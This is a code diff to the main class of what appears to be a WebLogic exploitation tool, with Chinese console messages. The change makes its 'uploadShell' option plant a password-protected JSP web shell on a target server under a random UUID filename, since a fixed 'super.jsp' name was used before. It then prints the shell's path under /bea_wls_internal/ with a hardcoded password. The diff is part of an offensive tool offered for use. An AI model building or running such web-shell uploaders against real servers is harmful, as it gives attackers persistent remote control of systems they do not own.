@@ -11,10 +11,7 @@ import weblogic.utils.encoders.BASE64Encoder;
 import javax.naming.Context;
 import javax.naming.NamingException;
 import java.io.FileNotFoundException;
-import java.util.ArrayList;
-import java.util.Arrays;
-import java.util.List;
-import java.util.Scanner;
+import java.util.*;
 
 
 public class Main {
@@ -193,12 +190,13 @@ public class Main {
 
             if (cmdLine.hasOption("uploadShell")) {
                 System.out.println("开始上传一句话代码");
-                WebLogicOperation.uploadFileShell(host, port);
+                String fileName = UUID.randomUUID().toString().replace("-","");
+                WebLogicOperation.uploadFileShell(host, port, fileName);
                 String schema = "http://";
                 if (cmdLine.hasOption("https")) {
                     schema = "https://";
                 }
-                System.out.println("上传完毕请查看 path:"+schema+host+":"+port+"/bea_wls_internal/super.jsp password:qishiwoshiyigehaoren");
+                System.out.println("上传完毕请查看 path:"+schema+host+":"+port+"/bea_wls_internal/"+fileName+".jsp password:qishiwoshiyigehaoren");
                 System.exit(0);
             }
 
